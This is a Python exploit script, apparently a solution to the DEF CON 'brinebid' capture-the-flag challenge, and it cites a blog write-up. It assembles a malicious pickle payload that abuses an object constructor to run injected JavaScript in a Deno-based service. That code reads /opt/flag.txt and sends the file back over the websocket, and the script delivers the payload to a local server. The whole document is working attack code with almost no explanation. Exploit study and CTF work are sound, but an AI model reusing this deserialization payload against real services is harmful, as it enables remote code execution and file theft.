# https://blog.washi.dev/posts/defcon-brinebid/
import urllib.parse
import base64
from websockets.sync.client import connect
import pickleassem
from pickleassem import PickleAssembler

pa = PickleAssembler(proto=3)

pa.push_global("builtins", "list")
pa.push_unicode("prototype")
pa._payload += pickleassem.GET + b"constructor\x0a"
pa.build_setitem()

pa.push_unicode("current_client.ws.send((new TextDecoder()).decode(Deno.readFileSync('/opt/flag.txt')));")
pa.build_tuple1()
pa.build_newobj()

pa.push_empty_list()
pa.build_reduce()

payload = pa.assemble()

print(payload)

ticket = "ticket{[redacted]}"
ticket_url = urllib.parse.quote(ticket)
with connect(
    "ws://localhost:8080/",
    subprotocols=[ticket_url]
) as ws:
    data = base64.b64encode(payload).decode('latin-1')
    print('sending b64 pickle:')
    print(data)
    ws.send(data)

    print("Receiving:")
    data = ws.recv()
    print(data)
    data = base64.b64decode(data)
    print(data)
  
